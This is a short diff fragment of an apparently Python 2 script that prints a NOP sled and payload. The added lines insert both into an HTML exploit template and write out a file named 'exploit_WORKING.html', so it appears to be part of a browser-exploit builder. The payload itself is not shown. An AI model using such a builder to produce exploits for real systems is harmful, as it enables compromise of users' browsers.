@@ -44,3 +44,12 @@ print "["
 print nop
 print payload
 print "]"
+
+f = open("payload/exploit_template.html", "r")
+contents = f.read().replace("$$REPLACEME$$", nop+"\n"+payload)
+f.close()
+
+f = open("payload/exploit_WORKING.html", "w")
+f.write(contents)
+f.close()
+
